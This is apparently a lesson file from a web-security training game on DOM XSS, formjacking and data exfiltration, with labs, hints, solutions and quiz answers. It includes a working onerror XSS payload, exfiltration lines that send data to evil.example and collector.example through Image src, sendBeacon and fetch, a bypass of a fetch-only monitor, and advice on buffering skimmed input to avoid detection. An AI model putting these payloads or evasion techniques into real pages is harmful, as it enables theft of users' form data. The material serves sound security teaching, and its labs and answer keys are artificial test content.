const XSS_SITE = `<div class="card"><h3>Welcome</h3><div id="greeting"></div></div>`;
// A malformed data: URI fails to decode as an image WITHOUT ever making a network
// request (data: URIs are resolved locally) — a real, working onerror-XSS payload
// that stays entirely inside the "no real network calls" sandbox guarantee.
const XSS_SETUP = `location.hash = '#<img src="data:," onerror="window.__xssFired=true">';
`;
const XSS_BUGGY = `var name = decodeURIComponent(location.hash.slice(1));
document.getElementById('greeting').innerHTML = "Hello, " + name + "!";
`;
// The <img>'s onerror fires asynchronously (image decode failure), so this waits for
// it (or a short timeout, for the fixed version where no <img> exists at all) before
// reporting — checking synchronously would race the event and always read "not fired".
const XSS_TEST = `(function () {
  function finish() { __report({ xssFired: window.__xssFired === true }); }
  var img = document.querySelector('#greeting img');
  if (img) {
    img.addEventListener('error', function () { setTimeout(finish, 0); });
    img.addEventListener('load', function () { setTimeout(finish, 0); });
    setTimeout(finish, 200);
  } else {
    setTimeout(finish, 0);
  }
})();
`;

const MONITOR_SETUP = `window.fetch = function (url, options) {
  __securityAlert('high', 'Blocked fetch to ' + url, 'naive-monitor');
  return Promise.reject(new Error('blocked by naive-monitor'));
};
`;
const MONITOR_SKELETON = `// window.fetch is blocked entirely by the monitor above.
// Get the string "stolen-data" to https://collector.example/report
// using a DIFFERENT browser API instead.
`;
const MONITOR_TEST = `(function () {
  var arrived = __networkLog.some(function (e) {
    return e.api !== 'fetch' && e.url && e.url.indexOf('collector.example') !== -1;
  });
  __report({ arrived: arrived });
})();
`;

const EXAMPLE_SITE = `<div class="card"><div id="a"></div><div id="b"></div></div>`;
const EXAMPLE_CODE = `var untrusted = "<b>bold text</b>";

document.getElementById('a').innerHTML = untrusted;
document.getElementById('b').textContent = untrusted;

console.log("a rendered as HTML:", document.getElementById('a').innerHTML);
console.log("b rendered as text:", document.getElementById('b').textContent);
`;

/** @type {import('../../game/lessonSchema.js').LessonContent} */
export default {
  id: 'formjacking-exfiltration',
  moduleId: 'client-side-attacks',
  title: 'Formjacking and Data Exfiltration',
  estimatedMinutes: 30,
  difficulty: 'core',
  prerequisites: ['third-party-js-execution'],
  relatedMissionIds: ['silent-skimmer'],
  skillTags: ['clientSideAttacks', 'webSecurity'],

  explanation: [
    'Every DOM XSS bug has the same two-part shape: untrusted data gets in somewhere (a source), and it reaches an API that treats a string as code or markup instead of plain text (a sink). Exfiltration is the same shape running in reverse — data an attacker already has needs an outbound channel, and the browser offers several independent ones. Neither half is exotic; it is ordinary browser APIs doing exactly what they are documented to do, applied to data that should never have reached them.',
    'A sink is any API that takes a string and does something dangerous with it: `innerHTML`/`outerHTML`/`insertAdjacentHTML` parse it as HTML, including any script-equivalent content like an `onerror` handler; `document.write` does similarly; `eval`/`new Function`/string-argument `setTimeout` execute it as JavaScript. A source is anywhere untrusted data enters — URL parameters, `location.hash`, form input, a third-party API response. `textContent` is never a sink, since it treats its input as literal text unconditionally. Exfiltration mirrors this: once code has data, it needs an outbound channel — `fetch`, XHR, `sendBeacon`, or an image-src beacon are all independent options, which matters for detection, since monitoring only one is not the same as monitoring exfiltration.',
    'Mutation XSS is worth understanding concretely: a sanitizer inspects a string, decides it is safe, and returns cleaned HTML — but that string then gets assigned to `innerHTML`, which hands it to the browser\'s parser a second time, once during the sanitizer\'s own parsing and once for real on insertion. Browsers sometimes normalize malformed-but-parseable markup differently on that second pass than the sanitizer assumed on the first, so a sequence that looked inert can become executable. Sanitization has to happen using the same parser and context the value will actually render into, never a generic string-cleaning pass — which is why `textContent`, never parsing its input at all, sidesteps this class entirely.',
    'A realistic skimmer rarely exfiltrates on every keystroke, since a request per keypress is an easy-to-spot shape in a network log — a more evasive version buffers values in memory and sends a single beacon only on `submit` or `visibilitychange`, so the source (continuous reads) would show up in DOM monitoring even though the sink (one late request) looks innocuous; a monitor watching only network traffic misses this unless it correlates sustained source activity with the eventual send. Coverage of one API is never coverage of a capability, either: instrumenting `innerHTML` alone misses `outerHTML`, `insertAdjacentHTML`, `document.write`, and an iframe\'s `srcdoc`, the same way instrumenting `fetch` alone misses `sendBeacon` and image-src beacons — defensive instrumentation is only as complete as its list of covered entry points.',
  ],

  distinctions: [
    { label: 'Browser-provided', text: 'innerHTML\'s HTML-parsing behavior and fetch/sendBeacon/Image\'s network behavior are Web APIs defined by browser specifications, not ECMAScript — the language itself has no concept of "HTML" or "network request."' },
    { label: 'Simplified model', text: '"XSS" is often talked about as one bug, but sinks differ in risk: textContent is never a sink; innerHTML is dangerous with attacker-controlled strings; eval/Function are dangerous with ANY untrusted string, HTML or not.' },
    { label: 'Implementation detail', text: 'How aggressively a browser\'s HTML parser normalizes malformed markup, which is what enables mutation XSS, varies subtly by engine — the safe rule (never feed untrusted strings to HTML-parsing sinks) holds regardless.' },
  ],

  tldr: [
    'DOM XSS is untrusted data (a source) reaching an API that parses it as HTML or executes it as code (a sink), with no safe transformation in between.',
    'textContent is never a sink; innerHTML/document.write parse as HTML, eval/Function execute as JavaScript.',
    'Sanitizing a string and still assigning it to an HTML-parsing sink can remain exploitable (mutation XSS) if the sanitizer\'s parse pass and the real render pass normalize markup differently.',
    'There are multiple independent outbound channels and multiple independent HTML-parsing sinks — covering one of either is not the same as covering the capability.',
  ],

  example: {
    runner: 'iframe',
    code: EXAMPLE_CODE,
    siteSnapshot: EXAMPLE_SITE,
    predictPrompt: 'The same untrusted-looking string is inserted two ways. Predict what the DOM inspector will show for each element, and what the two console.log lines will print.',
  },
  panels: ['dom'],

  labs: [
    {
      id: 'repair-dom-xss',
      title: 'Defend: repair a DOM XSS sink',
      type: 'defend',
      instructions: 'The greeting reads a name from the URL fragment and renders it. A crafted fragment (already set up for you) currently executes. Fix the sink.',
      runner: 'iframe',
      submissionMode: 'code',
      siteSnapshot: XSS_SITE,
      setupScript: XSS_SETUP,
      initialCode: XSS_BUGGY,
      testScript: XSS_TEST,
      validate(runResult) {
        if (runResult.error) return { passed: false, score: { correctness: 0, security: 0 }, feedback: [`Error: ${runResult.error}`] };
        const passed = runResult.returnValue?.xssFired === false;
        return { passed, score: { security: passed ? 1 : 0 }, feedback: [passed ? 'The payload no longer executes.' : 'The payload still executed — check the DOM inspector to see what actually got inserted.'] };
      },
      hints: [
        'The URL fragment is fully attacker-controlled (a user can be sent a link with anything after the #), and `innerHTML` parses whatever it\'s given as real HTML — including the `<img src=x onerror=...>` currently in there.',
        '`textContent` inserts a string as literal text, never parsed as markup — swap the sink and the same untrusted string becomes inert.',
      ],
      solution: `var name = decodeURIComponent(location.hash.slice(1));
document.getElementById('greeting').textContent = "Hello, " + name + "!";`,
      explanation: 'The vulnerability was never about `decodeURIComponent` or about `location.hash` specifically — it was that untrusted data reached an HTML-parsing sink at all. `textContent` isn\'t "safer innerHTML" — it\'s a fundamentally different operation that never interprets its input as markup, which is why it fully closes this class of bug rather than just making it harder to hit.',
    },
    {
      id: 'identify-exfil-channels',
      title: 'Predict: identify the exfiltration channel',
      type: 'predict',
      instructions: 'Match each snippet to the browser API it uses to send data out.',
      runner: 'none',
      submissionMode: 'answer',
      initialCode: '',
      sourceCode: `// Snippet 1
new Image().src = 'https://evil.example/c?d=' + data;

// Snippet 2
navigator.sendBeacon('https://evil.example/c', data);

// Snippet 3
fetch('https://evil.example/c', { method: 'POST', body: data });`,
      answerSchema: [
        { id: 's1', prompt: 'Snippet 1 uses:', type: 'select', options: ['fetch', 'XMLHttpRequest', 'navigator.sendBeacon', 'Image src (beacon)'] },
        { id: 's2', prompt: 'Snippet 2 uses:', type: 'select', options: ['fetch', 'XMLHttpRequest', 'navigator.sendBeacon', 'Image src (beacon)'] },
        { id: 's3', prompt: 'Snippet 3 uses:', type: 'select', options: ['fetch', 'XMLHttpRequest', 'navigator.sendBeacon', 'Image src (beacon)'] },
      ],
      validate(answers) {
        const correct = { s1: 'Image src (beacon)', s2: 'navigator.sendBeacon', s3: 'fetch' };
        const keys = Object.keys(correct);
        const matches = keys.filter((k) => answers[k] === correct[k]).length;
        const fraction = matches / keys.length;
        return { passed: fraction === 1, score: { correctness: fraction } };
      },
      hints: [
        'An `Image` object has no observable response — it\'s used purely to trigger a GET request as a side effect of setting `.src`.',
        '`sendBeacon` is designed specifically for fire-and-forget POSTs that survive page unload — a common choice for exfiltration right as a user navigates away.',
      ],
      solution: 'Snippet 1: Image src (beacon). Snippet 2: navigator.sendBeacon. Snippet 3: fetch.',
      explanation: 'All three genuinely send data to a remote host; they differ in ergonomics and detectability, not in fundamental capability — which is exactly why a monitor covering only one of them provides false confidence.',
    },
    {
      id: 'bypass-naive-monitor',
      title: 'Break it: find a channel the naive monitor misses',
      type: 'break',
      instructions: 'A security monitor blocks window.fetch entirely. Get the string "stolen-data" to https://collector.example/report using a channel it doesn\'t cover.',
      runner: 'iframe',
      submissionMode: 'code',
      siteSnapshot: '<div class="card">Monitor active.</div>',
      setupScript: MONITOR_SETUP,
      initialCode: MONITOR_SKELETON,
      testScript: MONITOR_TEST,
      validate(runResult) {
        if (runResult.error) return { passed: false, score: { correctness: 0 }, feedback: [`Error: ${runResult.error}`] };
        const passed = !!runResult.returnValue?.arrived;
        return { passed, score: { correctness: passed ? 1 : 0 }, feedback: [passed ? 'Data arrived through an unmonitored channel.' : 'No data reached the destination through anything other than fetch.'] };
      },
      hints: [
        'The monitor only touches `window.fetch` — every other network-capable API is completely untouched.',
        '`navigator.sendBeacon(url, data)` or `new Image().src = url + "?d=" + data` both reach the same destination without ever calling fetch.',
      ],
      solution: `navigator.sendBeacon('https://collector.example/report', 'stolen-data');`,
      explanation: 'This is the single most important lesson about runtime instrumentation: coverage of ONE API is not coverage of a CAPABILITY. "Block outbound requests" as a goal requires instrumenting every API that can make one — fetch, XMLHttpRequest, sendBeacon, and the Image-src beacon pattern, at minimum — not just the one an engineer happened to think of first.',
    },
  ],

  knowledgeCheck: [
    { id: 'kc-source-sink', question: 'Define "source" and "sink" in the context of DOM XSS, and explain why textContent is never a sink.', modelAnswer: 'A source is anywhere untrusted data enters the page (URL, form input, a third-party response). A sink is an API that does something dangerous with a string it\'s given. `textContent` is never a sink because it always treats its argument as literal text — it has no code path that parses or executes its input as HTML or JavaScript, unlike `innerHTML` (parses as HTML) or `eval` (executes as JS).', skillTag: 'clientSideAttacks' },
    { id: 'kc-why-powerful', question: 'Why is a compromised (or simply malicious) third-party script such a powerful attack vector compared to, say, a network-level attacker?', modelAnswer: 'It executes with full same-realm JavaScript privileges on the actual page — it can read live DOM state (including values a user has typed but not yet submitted), register its own listeners, and use any browser API the page itself could use — all without needing to intercept network traffic or defeat TLS. It\'s a first-class participant in the page\'s own execution, not an outside observer.', skillTag: 'clientSideAttacks' },
    { id: 'kc-coverage', question: 'A monitor blocks fetch and XMLHttpRequest but not sendBeacon or Image. Is that monitor "detecting exfiltration"? What would you tell someone who thought it was sufficient?', modelAnswer: 'No — it\'s detecting two specific APIs, not the general capability of "sending data out." Any script (malicious or just testing the boundary) can trivially exfiltrate through sendBeacon or an image-src beacon and never trip it. Comprehensive coverage requires instrumenting every network-capable API, not the subset that happened to come to mind first.', skillTag: 'runtimeInstrumentation' },
  ],

  interviewQuestions: [
    'Define DOM-based XSS in terms of sources and sinks, with a concrete example of each.',
    'Name at least three distinct browser APIs an attacker could use to exfiltrate data, and explain why monitoring only one is insufficient.',
    'Why can a compromised third-party script access data a network-level attacker cannot, even over an unencrypted connection?',
  ],
};
